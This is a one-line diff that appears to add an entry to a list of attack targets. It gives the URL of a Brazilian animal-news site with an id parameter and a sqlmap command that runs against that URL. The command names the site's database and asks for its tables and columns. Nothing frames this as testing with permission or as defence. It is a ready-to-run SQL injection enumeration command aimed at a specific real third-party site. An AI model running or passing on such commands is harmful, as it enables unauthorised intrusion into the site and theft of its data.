@@ -1,0 +1,1 @@
+https://www.conteudoanimal.com.br/noticias/ver.php?id=25822 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.conteudoanimal.com.br/noticias/ver.php?id=25822 -D conteud2_conteudoanimal --tables --columns
